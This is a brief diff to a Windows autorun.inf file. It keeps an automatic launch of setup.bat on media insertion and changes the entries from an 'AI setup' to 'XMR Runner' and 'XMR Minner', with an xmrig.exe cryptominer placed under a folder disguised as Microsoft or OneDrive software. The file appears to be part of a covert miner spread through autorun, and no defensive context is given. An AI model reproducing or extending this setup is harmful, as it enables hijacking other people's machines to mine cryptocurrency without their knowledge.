@@ -1,5 +1,5 @@
 [autorun]
 open=setup.bat
-action=Setup My AI
-label=MyAI Setup
-icon=Backups\myai.exe
+action=XMR Runner
+label=XMR Minner
+icon=Backups\onedrive\imp\Ai-Microsoft\xmrig.exe
